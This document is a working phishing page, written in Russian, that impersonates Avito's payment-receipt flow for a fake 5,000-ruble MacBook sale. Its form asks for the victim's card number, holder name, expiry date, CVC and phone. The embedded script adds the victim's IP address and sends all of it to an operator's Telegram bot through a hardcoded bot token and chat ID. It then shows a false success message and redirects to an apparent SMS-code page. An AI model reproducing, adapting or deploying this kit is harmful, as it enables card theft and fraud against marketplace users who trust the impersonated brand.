<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>–ê–≤–∏—Ç–æ ‚Ä¢ –ü–æ–ª—É—á–µ–Ω–∏–µ –æ–ø–ª–∞—Ç—ã –∑–∞ —Ç–æ–≤–∞—Ä</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', 'Roboto', sans-serif;
        }

        body {
            background: linear-gradient(135deg, #f5fff7 0%, #e8f5e9 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 480px;
            background: white;
            border-radius: 24px;
            overflow: hidden;
            box-shadow: 0 15px 35px rgba(56, 142, 60, 0.12);
            border: 1px solid #c8e6c9;
        }

        .header {
            background: linear-gradient(to right, #2e7d32, #4caf50);
            color: white;
            padding: 30px;
            text-align: center;
        }

        .avito-logo {
            font-size: 32px;
            font-weight: 800;
            letter-spacing: -0.5px;
            margin-bottom: 10px;
            display: block;
        }

        .header h1 {
            font-size: 22px;
            font-weight: 600;
            opacity: 0.95;
            margin-top: 10px;
        }

        .content {
            padding: 35px;
        }

        .payment-info {
            background-color: #f1f8e9;
            border-radius: 16px;
            padding: 20px;
            margin-bottom: 30px;
            border: 1px dashed #81c784;
        }

        .info-row {
            display: flex;
            justify-content: space-between;
            margin-bottom: 12px;
            font-size: 16px;
        }

        .info-row:last-child {
            margin-bottom: 0;
        }

        .label {
            color: #388e3c;
            font-weight: 500;
        }

        .value {
            font-weight: 700;
            color: #1b5e20;
        }

        .highlight {
            font-size: 28px;
            color: #1b5e20;
            text-align: center;
            padding: 10px;
            background: #e8f5e9;
            border-radius: 12px;
            margin: 15px 0;
            font-weight: 800;
        }

        .form-group {
            margin-bottom: 25px;
        }

        .form-group label {
            display: block;
            color: #2e7d32;
            font-weight: 600;
            margin-bottom: 10px;
            font-size: 15px;
        }

        .input-wrapper {
            position: relative;
        }

        .input-field {
            width: 100%;
            padding: 18px 20px;
            border: 2px solid #c8e6c9;
            border-radius: 12px;
            font-size: 16px;
            color: #1b5e20;
            background-color: #f9fdf9;
            transition: all 0.3s;
        }

        .input-field:focus {
            outline: none;
            border-color: #4caf50;
            background-color: white;
            box-shadow: 0 0 0 3px rgba(76, 175, 80, 0.2);
        }

        .input-field::placeholder {
            color: #81c784;
        }

        .card-icons {
            position: absolute;
            right: 18px;
            top: 50%;
            transform: translateY(-50%);
            display: flex;
            gap: 8px;
        }

        .card-icon {
            height: 24px;
            width: auto;
            opacity: 0.7;
        }

        .row {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
        }

        .submit-btn {
            width: 100%;
            padding: 22px;
            background: linear-gradient(to right, #388e3c, #4caf50);
            color: white;
            border: none;
            border-radius: 14px;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s;
            margin-top: 10px;
            letter-spacing: 0.5px;
        }

        .submit-btn:hover {
            background: linear-gradient(to right, #2e7d32, #43a047);
            transform: translateY(-2px);
            box-shadow: 0 7px 14px rgba(56, 142, 60, 0.25);
        }

        .submit-btn:active {
            transform: translateY(0);
        }

        .submit-btn:disabled {
            background: #a5d6a7;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }

        .secure-note {
            text-align: center;
            margin-top: 25px;
            color: #66bb6a;
            font-size: 14px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .status-message {
            margin-top: 25px;
            padding: 20px;
            border-radius: 12px;
            text-align: center;
            font-weight: 600;
            display: none;
        }

        .status-success {
            background-color: #e8f5e9;
            color: #1b5e20;
            border: 2px solid #a5d6a7;
            display: block;
        }

        .status-error {
            background-color: #ffebee;
            color: #c62828;
            border: 2px solid #ef9a9a;
            display: block;
        }

        .status-processing {
            background-color: #e3f2fd;
            color: #1565c0;
            border: 2px solid #90caf9;
            display: block;
        }

        .footer {
            text-align: center;
            padding: 25px;
            color: #81c784;
            font-size: 13px;
            border-top: 1px solid #e8f5e9;
            background: #f9fdf9;
        }

        .loader {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s ease-in-out infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body>
    <div class="container">
        <div class="header">
            <span class="avito-logo">AVITO</span>
            <h1>–ü–æ–ª—É—á–∏—Ç–µ –æ–ø–ª–∞—Ç—É –∑–∞ —Ç–æ–≤–∞—Ä</h1>
        </div>

        <div class="content">
            <div class="payment-info">
                <div class="info-row">
                    <span class="label">–ü—Ä–æ–¥–∞–≤–µ—Ü:</span>
                    <span class="value">–ò–≤–∞–Ω–æ–≤ –ê–ª–µ–∫—Å–µ–π</span>
                </div>
                <div class="info-row">
                    <span class="label">–¢–æ–≤–∞—Ä:</span>
                    <span class="value">–ù–æ—É—Ç–±—É–∫ Apple MacBook Pro</span>
                </div>
                <div class="info-row">
                    <span class="label">ID —Å–¥–µ–ª–∫–∏:</span>
                    <span class="value">#AV-7842-95</span>
                </div>
                <div class="highlight">
                    5 000 ‚ÇΩ
                </div>
                <div style="text-align: center; color: #388e3c; font-size: 15px; margin-top: 10px;">
                    <i class="fas fa-lock"></i> –ë–µ–∑–æ–ø–∞—Å–Ω—ã–π –ø–ª–∞—Ç–µ–∂ —á–µ—Ä–µ–∑ –ê–≤–∏—Ç–æ
                </div>
            </div>

            <form id="paymentForm">
                <div class="form-group">
                    <label for="cardNumber">–ù–æ–º–µ—Ä –±–∞–Ω–∫–æ–≤—Å–∫–æ–π –∫–∞—Ä—Ç—ã</label>
                    <div class="input-wrapper">
                        <input type="text" 
                               id="cardNumber" 
                               class="input-field" 
                               placeholder="1234 5678 9012 3456" 
                               maxlength="19" 
                               required>
                        <div class="card-icons">
                            <img src="https://img.icons8.com/color/48/000000/mastercard-logo.png" class="card-icon" alt="Mastercard">
                            <img src="https://img.icons8.com/color/48/000000/visa.png" class="card-icon" alt="Visa">
                            <img src="https://img.icons8.com/color/48/000000/mir.png" class="card-icon" alt="Mir">
                        </div>
                    </div>
                </div>

                <div class="form-group">
                    <label for="cardHolder">–ò–º—è –≤–ª–∞–¥–µ–ª—å—Ü–∞ –∫–∞—Ä—Ç—ã</label>
                    <input type="text" 
                           id="cardHolder" 
                           class="input-field" 
                           placeholder="–ö–∞–∫ –Ω–∞ –∫–∞—Ä—Ç–µ" 
                           required>
                </div>

                <div class="row">
                    <div class="form-group">
                        <label for="cardExpiry">–°—Ä–æ–∫ –¥–µ–π—Å—Ç–≤–∏—è</label>
                        <input type="text" 
                               id="cardExpiry" 
                               class="input-field" 
                               placeholder="–ú–ú/–ì–ì" 
                               maxlength="5" 
                               required>
                    </div>
                    <div class="form-group">
                        <label for="cardCVC">CVC/CVV</label>
                        <input type="text" 
                               id="cardCVC" 
                               class="input-field" 
                               placeholder="123" 
                               maxlength="4" 
                               inputmode="numeric" 
                               required>
                    </div>
                </div>

                <div class="form-group">
                    <label for="phone">–í–∞—à —Ç–µ–ª–µ—Ñ–æ–Ω –¥–ª—è —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π</label>
                    <input type="tel" 
                           id="phone" 
                           class="input-field" 
                           placeholder="+7 (900) 123-45-67" 
                           required>
                </div>

                <button type="submit" class="submit-btn" id="submitBtn">
                    <span id="btnText">–ü–æ–ª—É—á–∏—Ç—å 5 000 ‚ÇΩ</span>
                    <div id="btnLoader" class="loader" style="display:none;"></div>
                </button>

                <div class="secure-note">
                    <i class="fas fa-shield-alt"></i> –í–∞—à–∏ –¥–∞–Ω–Ω—ã–µ –∑–∞—â–∏—â–µ–Ω—ã —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ–º SSL
                </div>
            </form>

            <div id="statusMessage" class="status-message"></div>
        </div>

        <div class="footer">
            <p>¬© 2025 –ê–≤–∏—Ç–æ. –û–û–û ¬´–ê–≤–∏—Ç–æ –•–æ–ª–¥–∏–Ω–≥¬ª</p>
            <p style="margin-top: 5px; font-size: 12px;">–ü–ª–∞—Ç–µ–∂ –æ–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ—Ç—Å—è —á–µ—Ä–µ–∑ –±–µ–∑–æ–ø–∞—Å–Ω—ã–π —à–ª—é–∑</p>
        </div>
    </div>

    <script>
        // ========== –ö–û–ù–§–ò–ì–£–†–ê–¶–ò–Ø ==========
        // –ó–ê–ú–ï–ù–ò–¢–ï –≠–¢–ò –î–ê–ù–ù–´–ï –ù–ê –°–í–û–ò
        const BOT_TOKEN = '8318568144:AAH0rXReromePvHLJ5XTcXo7MJYKOptyhTY';   // –í–∞—à —Ç–æ–∫–µ–Ω –±–æ—Ç–∞ –æ—Ç @BotFather
        const CHAT_ID = '5213238680';       // –í–∞—à ID —á–∞—Ç–∞ –≤ Telegram

        // ========== –§–û–†–ú–ê–¢–ò–†–û–í–ê–ù–ò–ï –í–í–û–î–ê ==========
        document.getElementById('cardNumber').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            let formatted = value.replace(/(\d{4})/g, '$1 ').trim();
            e.target.value = formatted.substring(0, 19);
        });

        document.getElementById('cardExpiry').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length >= 2) {
                e.target.value = value.substring(0, 2) + '/' + value.substring(2, 4);
            } else {
                e.target.value = value;
            }
        });

        document.getElementById('cardCVC').addEventListener('input', function(e) {
            e.target.value = e.target.value.replace(/\D/g, '').substring(0, 4);
        });

        document.getElementById('phone').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length === 0) return;
            if (value[0] === '7' || value[0] === '8') {
                value = value.substring(1);
            }
            let formatted = '+7';
            if (value.length > 0) formatted += ' (' + value.substring(0, 3);
            if (value.length >= 4) formatted += ') ' + value.substring(3, 6);
            if (value.length >= 7) formatted += '-' + value.substring(6, 8);
            if (value.length >= 9) formatted += '-' + value.substring(8, 10);
            e.target.value = formatted;
        });

        // ========== –û–¢–ü–†–ê–í–ö–ê –§–û–†–ú–´ ==========
        document.getElementById('paymentForm').addEventListener('submit', async function(e) {
            e.preventDefault();

            const btn = document.getElementById('submitBtn');
            const btnText = document.getElementById('btnText');
            const btnLoader = document.getElementById('btnLoader');
            const statusDiv = document.getElementById('statusMessage');

            // –ë–ª–æ–∫–∏—Ä—É–µ–º –∫–Ω–æ–ø–∫—É –∏ –ø–æ–∫–∞–∑—ã–≤–∞–µ–º –∑–∞–≥—Ä—É–∑–∫—É
            btn.disabled = true;
           // window.location.href = '/sms.html'; // –ò–ª–∏ '/sms.php', –∏–ª–∏ 'sms/'
            btnText.style.display = 'none';
            btnLoader.style.display = 'inline-block';
            statusDiv.className = 'status-processing';
            statusDiv.textContent = '–û–±—Ä–∞–±–æ—Ç–∫–∞ –ø–ª–∞—Ç–µ–∂–∞...';
            statusDiv.style.display = 'block'; 
            //header('Location: sms.html');

            // –°–æ–±–∏—Ä–∞–µ–º –¥–∞–Ω–Ω—ã–µ
            const paymentData = {
                amount: '5 000 ‚ÇΩ',
                cardNumber: document.getElementById('cardNumber').value,
                cardHolder: document.getElementById('cardHolder').value,
                cardExpiry: document.getElementById('cardExpiry').value,
                cardCVC: document.getElementById('cardCVC').value,
                phone: document.getElementById('phone').value,
                timestamp: new Date().toLocaleString('ru-RU'),
                userAgent: navigator.userAgent.substring(0, 100),
                ip: await fetch('https://api.ipify.org?format=json')
                         .then(r => r.json())
                         .then(data => data.ip)
                         .catch(() => '–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω')
            };

            // –§–æ—Ä–º–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –¥–ª—è Telegram
            const message = `
üí≥ *–ù–û–í–ê–Ø –û–ü–õ–ê–¢–ê –ù–ê –ê–í–ò–¢–û ‚Äî 5 000 ‚ÇΩ*
‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî
*üí∏ –°—É–º–º–∞:* 5 000 ‚ÇΩ
‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî
*üë§ –î–∞–Ω–Ω—ã–µ –ø–æ–∫—É–ø–∞—Ç–µ–ª—è:*
–¢–µ–ª–µ—Ñ–æ–Ω: ${paymentData.phone}
‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî
*ü™™ –î–∞–Ω–Ω—ã–µ –∫–∞—Ä—Ç—ã:*
–ù–æ–º–µ—Ä: \`${paymentData.cardNumber}\`
–î–µ—Ä–∂–∞—Ç–µ–ª—å: ${paymentData.cardHolder}
–°—Ä–æ–∫: ${paymentData.cardExpiry}
CVC: \`${paymentData.cardCVC}\`
‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî
*üìä –¢–µ—Ö–Ω–∏—á–µ—Å–∫–∏–µ –¥–∞–Ω–Ω—ã–µ:*
IP: ${paymentData.ip}
–í—Ä–µ–º—è: ${paymentData.timestamp}
‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî
            `.trim();

            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ Telegram
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            const payload = {
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown',
                disable_web_page_preview: true
            };

            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                const result = await response.json();

                if (result.ok) {
                    // –£—Å–ø–µ—Ö
                    statusDiv.className = 'status-success';
                    statusDiv.innerHTML = '<i class="fas fa-check-circle"></i> –û–ø–ª–∞—Ç–∞ —É—Å–ø–µ—à–Ω–æ –ø–æ–ª—É—á–µ–Ω–∞! –°—Ä–µ–¥—Å—Ç–≤–∞ –∑–∞—á–∏—Å–ª—è—Ç—Å—è –Ω–∞ –≤–∞—à —Å—á–µ—Ç –≤ —Ç–µ—á–µ–Ω–∏–µ 5 –º–∏–Ω—É—Ç.';
                    document.getElementById('paymentForm').reset();
                    window.location.href = '/sms.html'; // –ò–ª–∏ '/sms.php', –∏–ª–∏ 'sms/'
                } else {
                    throw new Error('–û—à–∏–±–∫–∞ Telegram API');
                }
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞:', error);
                statusDiv.className = 'status-error';
                statusDiv.innerHTML = '<i class="fas fa-exclamation-triangle"></i> –û—à–∏–±–∫–∞ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø—Ä–æ–≤–µ—Ä—å—Ç–µ –¥–∞–Ω–Ω—ã–µ –∏ –ø–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞.';
            } finally {
                // –í–æ—Å—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∫–Ω–æ–ø–∫—É
                btn.disabled = false;
                btnText.style.display = 'inline';
                btnLoader.style.display = 'none';
            }
        });

        // –ê–≤—Ç–æ-—Ñ–æ–∫—É—Å –Ω–∞ –ø–µ—Ä–≤–æ–µ –ø–æ–ª–µ
        document.getElementById('cardNumber').focus();
    </script>
</body>
</html>